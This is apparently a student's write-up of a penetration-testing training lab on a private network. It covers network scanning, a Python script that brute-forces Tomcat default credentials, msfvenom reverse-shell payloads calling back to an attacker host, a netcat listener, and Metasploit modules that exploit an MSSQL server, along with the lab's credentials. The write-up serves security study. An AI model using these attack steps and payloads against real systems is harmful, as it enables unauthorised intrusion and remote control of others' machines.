---
description: Write up for the Black-Box PenTesting 1 by the end of the PTS from IN
---

# Black Box 1

### Target:

```
172.16.64.0/24
```

### Goals

* Discover and exploit all the machines on the network.&#x20;
* Read all flag files (one per machine)

### What you will learn:

* How to exploit Apache Tomcat.
* How to exploit SQL Server.
* Post-exploitation discovery.
* Arbitrary file upload exploitation

### Recommended tools

* Dirb.&#x20;
* Metasploit framework (recommended version: 5).
* Nmap.&#x20;
* Netcat.

## My Solution:

### Network+Info:

#### routing:

```
└─$ route -n           

Kernel IP routing table
Destination     Gateway         Genmask       Use Iface
10.9.0.0        0.0.0.0         255.255.0.0     0 tun0
10.10.0.0       10.9.0.1        255.255.0.0     0 tun0
172.16.64.0     0.0.0.0         255.255.255.0   0 tap0                                                                               
```

#### recon:

```
└─$ fping -a -g 172.16.64.0/24  
172.16.64.10
172.16.64.101
172.16.64.140
172.16.64.182
172.16.64.199
```

```bash
└─$  sudo nmap -sS 172.16.64.0/24 

Nmap scan report for 172.16.64.101
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
9080/tcp open  glrpc
MAC Address: 00:50:56:A0:66:F6 (VMware)

Nmap scan report for 172.16.64.140
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:50:56:A0:3E:67 (VMware)

Nmap scan report for 172.16.64.182
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:50:56:A0:CC:94 (VMware)

Nmap scan report for 172.16.64.199
Not shown: 996 closed ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
MAC Address: 00:50:56:A0:F6:41 (VMware)

Nmap scan report for 172.16.64.10
All 1000 scanned ports on 172.16.64.10 are closed
```

#### OS FingerPrinting:

```bash
└─$ sudo nmap -Pn -sV -O -A -iL fping_out.txt

Nmap scan report for 172.16.64.101
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache2 Ubuntu Default Page: It works
9080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:50:56:A0:66:F6 (VMware)
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), DD-WRT (Linux 3.18) (95%), DD-WRT v3.0 (Linux 4.4.2) (95%), Linux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Android 4.1.1 (94%), Android 4.2.2 (Linux 3.4) (94%), Android 4.1.2 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Nmap scan report for 172.16.64.140
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 404 HTML Template by Colorlib
MAC Address: 00:50:56:A0:3E:67 (VMware)
Aggressive OS guesses: Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), DD-WRT v3.0 (Linux 4.4.2) (95%), Linux 4.4 (95%), Linux 3.16 (95%), Android 4.1.1 (95%), Android 4.2.2 (Linux 3.4) (95%), DD-WRT (Linux 3.18) (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop


Nmap scan report for 172.16.64.182
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
MAC Address: 00:50:56:A0:CC:94 (VMware)
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Nmap scan report for 172.16.64.199
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2014
| ms-sql-ntlm-info: 
|   Target_Name: WIN10
|   NetBIOS_Domain_Name: WIN10
|   NetBIOS_Computer_Name: WIN10
|   DNS_Domain_Name: WIN10
|   DNS_Computer_Name: WIN10
|_  Product_Version: 10.0.10586
MAC Address: 00:50:56:A0:F6:41 (VMware)
Aggressive OS guesses: Microsoft Windows 10 (96%), Microsoft Windows 10 1507 (96%), Microsoft Windows 10 1507 - 1607 (96%), Microsoft Windows 10 1511 (96%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (96%), Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows 10 10586 - 14393 (93%), Microsoft Windows 10 1607 (93%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (93%), Microsoft Windows Server 2008 SP1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| ms-sql-info: 
|   172.16.64.199:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_nbstat: NetBIOS name: WIN10, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:a0:f6:41 (VMware)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-16T04:10:22
|_  start_date: 2021-08-15T10:34:56
```

### First target (Apache Tomcat):

```bash
172.16.64.101
```

helpful: [https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat)ls



#### dir busting:

```bash
└─$ sudo gobuster dir -u http://172.16.64.101:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt       

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.64.101:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
 Starting gobuster in directory enumeration mode
===============================================================
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/index.html           (Status: 200) [Size: 11321]                 
/manager              (Status: 302) [Size: 0] [--> /manager/] 
```

/manager is  default tomcat for admin server creds it asks for user/pass popout let's test using the default creds:

[https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown)

let's use the list and save it inside creds.txt with a python script to bruteforce:

```python
import requests
from requests.auth import HTTPBasicAuth


url = 'http://172.16.64.101:8080/manager'

with open('creds.txt', 'r') as f:
    for line in f:
        cred = line.split()
        if cred[0] == '<blank>':
            response = requests.get(url, auth=HTTPBasicAuth('', cred[1]))
        if cred[1] == '<blank>':
            response = requests.get(url, auth=HTTPBasicAuth(cred[0], ''))
        response = requests.get(url, auth=HTTPBasicAuth(cred[0], cred[1]))

        if response.status_code == 200:
            print("[+] Found: ", cred)
            break
        else:
            print("[-] NOT Found: ", cred)
```

from it we got the following:

```c
[+] Found: tomcat s3cret
```

after log-in we notice that we can deploy fils, time to exploit by deploying a webshell, as it's a tomcat we will use a .war formate build one by:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=8080 -f war -o revshell.war
```

start the webshell then visit it : [http://172.16.64.101:8080/revshell/](http://172.16.64.101:8080/revshell/) listen to it:

```bash
nc -lvnp 8080 
```

another way is to use metasploite:

```bash
 use exploit/multi/handler 
 set payload linux/x64/meterpreter_reverse_tcp 
 set lhost <ip>
 set lport 9080 
 run
```

then upload the appropriate mfvenome:

```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=<ip> lport=9080 -f elf -o meter
```



### Second Target (Apache httpd):

```bash
172.16.64.140
```

#### dir busting:

```bash
└─$ sudo gobuster dir -u http://172.16.64.140 -w /usr/share/seclists/Discovery/Web-Content/common.txt                                                                  1 ⨯
===============================================================
Gobuster v3.1.0
===============================================================
[+] Url:                     http://172.16.64.140
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/css                  (Status: 301) [Size: 312] [--> http://172.16.64.140/css/]
/img                  (Status: 301) [Size: 312] [--> http://172.16.64.140/img/]
/index.html           (Status: 200) [Size: 1487]                               
/project              (Status: 401) [Size: 460]                                
/server-status        (Status: 403) [Size: 301]                                
                                                                               
===============================================================
Finished
===============================================================
```

/project: apparently the only accessible one (with the prompt hint let's try admin:admin) .

#### more dir busting but now we know the creds:

```bash
└─$ sudo gobuster dir -u http://172.16.64.140/project/ -w /usr/share/seclists/Discovery/Web-Content/common.txt  -U admin -P admin
===============================================================
Gobuster v3.1.0
===============================================================
[+] Url:                     http://172.16.64.140/project/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Auth User:               admin
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 305]
/.hta                 (Status: 403) [Size: 300]
/.htaccess            (Status: 403) [Size: 305]
/backup               (Status: 301) [Size: 323] [--> http://172.16.64.140/project/backup/]
/css                  (Status: 301) [Size: 320] [--> http://172.16.64.140/project/css/]   
/images               (Status: 301) [Size: 323] [--> http://172.16.64.140/project/images/]
/includes             (Status: 403) [Size: 304]                                           
/index.html           (Status: 200) [Size: 6525]                                          
                                                                                          
===============================================================
Finished
===============================================================
```

/backups: looks interesting doing same against it we will discover /test:\
inside it there are intersting info regarding the SQL server we will use it to attack our fourth target now.



### Third Target (Ubuntu Host):

```bash
172.16.64.182
```

apparently it got hacked by hacking 4'th target we found the ssh cred.

### Fourth Target (Win10 SQL Server):

```bash
172.16.64.199
```

really healpfull:

{% embed url="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server" %}

from target 2 we got Username/pass let's try to log-in with them in metasploit console:

```bash
use auxiliary/scanner/mssql/mssql_login 
set rhosts 172.16.64.199 
set rport 1433 
set username fooadmin 
set password fooadmin 
run
```

![output runing the scanner](<../../.gitbook/assets/image (37).png>)

enumerate with:

```bash
auxiliary/admin/mssql/mssql_enum 
```

allow us to find more admin creds time to exploit:

```bash
use exploit/windows/mssql/mssql_payload 
set password fooadmin 
set username fooadmin 
set srvport 53 
set rhosts 172.16.64.199 
set payload windows/x64/meterpreter_reverse_tcp 
set lhost <ip>
set lport 443 
run
```

now we have a meterpreter session we can pop a shell:

```bash
shell
cd C
dir /s /b flag.txt
cd C:\Users\AdminELS\Desktop\
type flag.txt
```

even thou it's compromised id_rsa.pub looks interesting (looks like SSH rsa keys)_ `type id_rsa.pub` shows its not a real key but have ssh creds :

```bash
ssh developer@172.16.64.182  
dF3334slKw //password
```

thus also the 3'rd target is hacked .

